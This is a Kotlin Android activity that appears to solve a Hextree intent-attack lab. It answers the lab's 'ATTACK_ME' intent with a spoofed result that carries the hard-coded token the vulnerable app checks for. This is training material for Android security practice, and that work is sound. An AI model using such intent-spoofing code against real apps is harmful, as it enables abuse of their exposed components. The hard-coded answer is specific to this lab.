package io.ks.intentatk

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity

class RecvIntent10to12 : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Handle the incoming intent with the action
        val action = intent?.action
        if (action == "io.hextree.attacksurface.ATTACK_ME") {
            // Prepare a response Intent
            val resultIntent = Intent().apply {
                // intent.getIntExtra("token", -1) == 1094795585
                putExtra("token", 1094795585) // Send the required token back
            }
            setResult(RESULT_OK, resultIntent)
        } else {
            setResult(RESULT_CANCELED)
        }

        // Finish the activity after setting the result
        finish()
    }

}
